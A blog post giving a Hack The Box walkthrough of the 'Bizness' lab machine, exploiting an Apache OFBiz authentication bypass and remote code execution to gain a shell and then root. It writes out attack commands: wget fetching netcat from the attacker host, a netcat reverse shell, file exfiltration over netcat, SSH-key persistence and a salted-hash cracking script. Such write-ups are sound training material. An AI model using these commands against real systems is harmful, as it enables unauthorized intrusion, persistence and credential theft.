---
layout: post
title: Bizness
date: 2024-01-23 10:14:00-0400
description: Bizness - Hack The Box walkthrough.
tags: easy-box HTB CTF SSRF authentication-bypass persistence linpeas
categories: HTB-Machines
thumbnail: /assets/img/bizness.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false

---

# Introduction
Bizness is an easy box with a relatively convoluted privilege escalation that is not-so-easy. It involves enumerating a web application running an open-source enterprise resource planning (ERP) system called **Apache OFBiz**. The ERP has an **authentication bypass** vulnerability that allows for a subsequent an **Server Side Request Forgery (SSRF)** vulnerability to be exploited to obtain a reverse shell.

From there the system is enumerated manually and with the help of Linpeas to locate a custom-salted hash. Once the hash is cracked, it is just a matter of switching to the root user to obtain the final flag.


## Methods

### Authentication bypass

An authentication bypass vulnerability is a security flaw that allows an attacker to access a system, application, or network without going through the standard authentication process. This type of vulnerability effectively undermines the security mechanisms that verify the identity of a user or entity, granting unauthorized access.

Key aspects of an authentication bypass vulnerability include:

1. **Bypassing Security Checks:** The attacker finds a way to circumvent or exploit weaknesses in the authentication process, such as exploiting code flaws, misconfigurations, or logic errors.
    
2. **Unauthorised Access:** As a result, the attacker gains access to restricted areas of the system or application, often with the same privileges as a legitimate user.
    
3. **Potential Impact:** This can lead to various security issues, such as data breaches, privilege escalation, and system compromise.
    
4. **Common Causes:** Causes might include inadequate input validation, insecure direct object references, or flawed session management.

### Server Side Request Forgery (SSRF)
 
Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to manipulate the requests made by the server.

In an SSRF attack, the attacker can:

1. **Access Services Inaccessible to the Public:** The attacker can target internal systems behind firewalls that are normally inaccessible from the external network, including services running on the server itself (like databases or internal web applications).
    
2. **Manipulate Requests:** The attacker might manipulate the server to send requests to unintended locations, possibly leading to information disclosure, privilege escalation, or other malicious activities.
    
3. **Conduct Port Scanning:** SSRF can be used to scan ports and find services running on servers within the organization's internal network.
    
4. **Exploit Vulnerable Services and APIs:** If the internal systems have vulnerabilities, SSRF can provide a pathway for exploiting these vulnerabilities.
    

Mitigating SSRF typically involves validating and sanitizing all user input, especially URLs, implementing strict access controls, and using allowlists for external services that the application can interact with.

SSRF is a significant security concern in modern web applications, especially those that interact with complex systems and external services.

## Tools

- **Nmap** for initial network enumeration.
- **<a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">CVE-2023-51467 POC</a>)** for vulnerability scanning and initial access.
- **<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a>** for system enumeration.
- **<a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">Custom python script</a>** to convert custom SHA hash.

## Tactics

- **Establishing persistence** via rogue SSH keys.


---
# Enumeration
As always, enumeration begins with an Nmap scan.

## Nmap scanning

```bash
nmap -sC -sV 10.129.8.141 | tee nmap-output.txt    
```

```bash
Nmap scan report for 10.129.8.141
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.11 seconds
                                                                
```

### Findings

1. Three ports open:
	- 22
	- 80
	- 443
2. Domain name http://bizness.htb

## Domain enumeration

The domain `bizness.htb` can be added to the local hosts file:

```bash
echo "10.129.8.141 bizness.htb" | sudo tee -a /etc/hosts
```

This makes it reachable and reveals a simple landing page:

<img src="/assets/img/20240123-bizness/20240123-page.png" alt="20240123-page.png" class="auto-resize">

At the bottom of the page, it states the site is powered by **Apache OFBiz**.

<img src="/assets/img/20240123-bizness/20240123-pagepower.png" alt="20240123-pagepower.png" class="auto-resize">

### What is Apache OFBiz
  
Apache OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz includes modules for inventory management, order management, customer relationship management (CRM), e-commerce, accounting, and supply chain management, among others.

A Google search for *Apache OFBiz vulnerabilities* returns a critical zero-day (CVE-2023-51467).
### What is CVE-2023-51467
  
CVE-2023-51467 is a critical vulnerability in Apache OFBiz, involving an authentication bypass with a CVSS score of 9.8. The vulnerability, particularly affecting the `/webtools/control/ping` HTTP endpoint, allows unauthorised access without authentication. 

While initially demonstrating the vulnerability's existence, further analysis revealed its potential for arbitrary code execution, including executing payloads directly from memory. This flaw enables attackers not only to bypass authentication but also to potentially exploit Server-Side Request Forgery (SSRF) vulnerabilities.

---
## Apache OFBiz enumeration

Without knowing the version of Apache OFBiz, it is unclear whether the target is vulnerable to the zero-day. However, a search of GitHub revealed numerous PoCs to scan a target to confirm or deny if the ERP is vulnerable.

One such scanner is <a href="https://github.com/Chocapikk/CVE-2023-51467">
Chocapikk/CVE-2023-51467: Apache OfBiz Auth Bypass Scanner for CVE-2023-51467</a>, which was used to confirm the target is, in fact, vulnerable.



First the scanner is cloned from the repository and the dependencies installed.

```bash 
sudo git clone https://github.com/Chocapikk/CVE-2023-51467.git

pip install -r requirements.txt 
```

Then the scanner can be executed by passing the domain and an output location. The output location is useful if a list of domains were being scanned. As the output shows, the `bizness.htb` is indeed vulnerable.

```bash
python exploit.py -u bizness.htb -o ~/Documents/htb-machines/bizness/scans/output.txt
[00:00:49] Vulnerable URL found: bizness.htb, Response: PONG                                                                                                                  exploit.py:53
|████████████████████████████████████████| 1/1 [100%] in 3.3s (0.30/s) 

```

---
# Exploitation

Another exploit scanner which includes an exploit POC as well was found.

Using <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">jakabakos/Apache-OFBiz-Authentication-Bypass</a> the target was reconfirmed to be vulnerable.

```bash
└─$ python3 exploit.py --url http://bizness.htb                                                                                                          │
[+] Scanning started...                                                                                                                                  │
[+] Apache OFBiz instance seems to be vulnerable.  
```

This particular POC included the exploit itself, which will provide **remote code execution** on the target. Theoretically this can be leveraged to induce the server to request a payload from a malicious server. In this instance, it can be used to move `netcat` onto the  target to establish a reverse-shell.

To do this `nc` can be copied to a working directory:

```bash
cp /usr/bin/nc ./
```

Then a simple python webserver can be started to serve the binary:

```bash
python3 -m http.server 80
```

Once `netcat` is ready to be served, the exploit can be used to remotely execute a command on the target to fetch binary:

```bash
python3 exploit.py --url http://bizness.htb --cmd "wget http://10.10.14.5/nc"  

[+] Generating payload...                                                               
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true           
[+] Payload generated successfully.                                                     
[+] Sending malicious serialized payload...                                             
[+] The request has been successfully sent. Check the result of the command.   
```

Now that `netcat` is on the target, a listener can be established on a local machine to receive a reverse-shell.<sup><a href="#note2" id="ref2">2</a></sup></p>

```bash
rlwrap -cAr nc -lvnp 4321
```

Once a listener is active, a subsequent command can be sent to the target which will execute `netcat` on the target to establish the reverse shell.

```bash
python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.14.5 4321 -c /bin/bash"
```

The reverse shell is then caught by the listener.

```bash
└─$ rlwrap -cAr nc -lvnp 4321  
listening on [any] 4321 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.8.141] 38270
whoami
ofbiz
```

Once the reverse-shell is established, it can be upgraded with a simple python script to improve the  interactivity.

```python
python3 -c "import pty;pty.spawn('/bin/bash')"
```

A quick look around and the first flag is found.

<img src="/assets/img/20240123-bizness/20240123-userflag.png" alt="20240123-userflag.png" class="auto-resize">

---
# Establishing persistence

It can be helpful to establish persistence on a target to ensure it can be easily accessed without having to exploit it again through the initial vulnerability. This can help evade detection and ensure access in the event the initial attack vector is mitigated.

One way to do this is to place an **authorized ssh key** on the target.

To do this, the `.ssh` folder is required in the `/home/ofbiz` directory.

Within this folder an `authorized_keys` file is needed.

```bash
mkdir .ssh

cd .ssh

touch authorized_keys
```

On the machine from which the target will be accessed, **ssh keys** are required.

```bash
ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/ofbiz/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/ofbiz/.ssh/id_rsa
Your public key has been saved in /home/ofbiz/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:<REDACTED>+
```

Then the public key needs to be copied over and placed in the `/home/ofbiz/.ssh/authorized_keys` file. This can be achieved with:

`echo "contents-of-public-key" > /home/ofbiz/.ssh/authorized_keys`

Then the private key needs `chmod 600 id_rsa` permission, which will enable ssh login with:

```bash
ssh -i /path/to/private0-key ofbiz@IP
```

As long as the key remains in the authorized_keys file, this method can be used to return to the target as required.

---
# System enumeration

Enumerating the system for a vector to achieve privilege escalation was rather challenging for an easy box. 
## Linepeas

A good starting point is to move `linpeas` onto the system and execute it. The binary can be moved over using the `python -m http.server`.

Once there it can be ran with:

```bash
bash linpeas.sh | tee output.txt
```

This will send the output to both the console and a txt file for later review.

The output can be sent back to a local machine using `netcat` again.

Firstly start another `netcat` listener on the receiving machine:

```bash
nc -l -p 4321 > ~/path/to/a/receiving/file.txt
```

Then, on the target, send the file using:

```bash
nc 10.10.14.5 4321 < output.txt
```

This series of commands essentially streams the contents of the output.txt on the target machine, back to the output.txt file on the receiving machine.

## File searching

 Reviewing the Linpeas output eventually leads to a writeable directory `/opt/ofbiz/runtime/data/derby`
 
After much reading, it was found in an <a href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide">Apache wiki</a> that OFBiz uses an embedded Java database called **Derby**.

<img src="/assets/img/20240123-bizness/20240123-wikiresearch.png" alt="20240123-wikiresearch.png" class="auto-resize">

After reviewing the file system structure, an interesting README is located: inside the database directory.

<img src="/assets/img/20240123-bizness/20240123-readme-warning.png" alt="20240123-readme-warning.png" class="auto-resize">

The `seg0` database contains a number of .dat files. 

>*ChatGPT was kind enough to explain that .dat files in the context of Apache OFBiz  are used for data loading purposes. Given the README notice, it's possible that these files might contain credentials.*

The command `find seg0 -type f -exec cat {} \; > dir.txt` can be used to create a file that contains the combined contents of all the files found in the `seg0` directory and its subdirectories.<sup><a href="#note1" id="ref1">1</a></sup></p>

This can be useful for consolidating data or logs spread across multiple files into a single document for easier analysis or review.

The command `strings dir.txt | grep SHA` can then be used to extract printable strings from the consolidated file and search for any occurrence of text. After many attempts, the string "SHA" was tried.

This revealed a hash.

<img src="/assets/img/20240123-bizness/20240123-hash.png" alt="20240123-hash.png" class="auto-resize">

The  hash has a salt and would need to be converted to hexadecimal to be cracked by Hashcat.

Despite trying to do this with the help of ChatGPT, I was unable to obtain a hash that was suitable for Hashcat.

In the end, I found a python script that was able to do this, thanks to this <a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">write up</a>.

The script is:

```python
import hashlib  
import base64  
import os  
def cryptBytes(hash_type, salt, value):  
if not hash_type:  
hash_type = "SHA"  
if not salt:  
salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')  
hash_obj = hashlib.new(hash_type)  
hash_obj.update(salt.encode('utf-8'))  
hash_obj.update(value)  
hashed_bytes = hash_obj.digest()  
result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"  
return result  
def getCryptedBytes(hash_type, salt, value):  
try:  
hash_obj = hashlib.new(hash_type)  
hash_obj.update(salt.encode('utf-8'))  
hash_obj.update(value)  
hashed_bytes = hash_obj.digest()  
return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')  
except hashlib.NoSuchAlgorithmException as e:  
raise Exception(f"Error while computing hash of type {hash_type}: {e}")  
hash_type = "SHA1"  
salt = "d"  
search = "REDACTED"  
wordlist = '/usr/share/wordlists/rockyou.txt'  
with open(wordlist,'r',encoding='latin-1') as password_list:  
for password in password_list:  
value = password.strip()  
hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))  
# print(hashed_password)  
if hashed_password == search:  
print(f'Found Password:{value}, hash:{hashed_password}')
```


This script reads through a list of potential passwords (`rockyou.txt`), hashes each one using the specified algorithm and salt, and then compares the resulting hash to a target hash. If a match is found, it prints the plaintext password along with its hash.

```bash
└──╼ $python3 solve.py 
Found Password:REDACTED, hash:$SHA1$d$uP0_QaVBpDWFeo8-REDACTED=

```

Switching to `root` and trying the password works, and the root flag is obtained.

<img src="/assets/img/20240123-bizness/20240123-rootflag.png" alt="20240123-rootflag.png" class="auto-resize">


# Footnotes

<ol>
<li id="note1"> <a href="#ref1">↩</a></li> The command breakdown is:

  1. **`find seg0 -type f`**:
      - `find`: This is a command used to search for files in a directory >hierarchy.
      - `seg0`: This specifies the directory where the `find` command starts its search. In this case, it's looking in the `seg0` directory.
      - `-type f`: This option tells `find` to look for files (not directories).

  2. **`-exec cat {} \;`**:
      - `-exec`: This option of the `find` command allows you to execute another command on each of the files found.
      - `cat {}`: This is the command that `find` will execute on each file. `cat` is a standard Unix utility that reads files and outputs their content. The `{}` is a placeholder for each file `find` locates.
      - `\;`: This is a delimiter that indicates the end of the `exec` command.

  3. **`> dir.txt`**:
      - `>`: This is an output redirection operator in Unix/Linux. It directs the output from the preceding command to a file.
      - `dir.txt`: This is the file into which the output of the previous commands will be saved. 
        
<li id="note2"><a href="#ref2">↩</a></li>

The command `rlwrap -cAr nc -lvnp 9010` is a combination of several utilities and options that are commonly used in reverse shell setups. Here's a breakdown of the command:

1. **`rlwrap`**: 
    - This is a utility that provides readline capabilities to commands that may not have them. Readline allows for command line editing, persistent history, and auto-completion. In the context of this command, `rlwrap` is used to enhance the functionality of `nc` (Netcat).

2. **`-cAr`**: These are options for `rlwrap`:
    - `-c`: Enables command completion.
    - `-A`: Enables command auto-completion.
    - `-r`: Keeps a history of commands.

3. **`-lvnp 4321`**: These are options for `nc`:
    - `-l`: Puts Netcat into listening mode, where it waits for incoming connections.
    -  `-v`: Verbose mode. Netcat will provide more information about what it's doing.
    - `-n`: No DNS. Tells Netcat not to resolve hostnames via DNS. This can speed up operations if DNS resolution is not required.
    - `-p 4321`: Specifies the port number on which Netcat will listen for incoming connections.
    
So, putting it all together, `rlwrap -cAr nc -lvnp 4321` runs Netcat in listening mode on port 4321 with enhanced readline capabilities provided by `rlwrap`. This setup is typically used when you're expecting to receive a reverse shell, and you want the ability to interact with that shell more effectively using command history and completion.
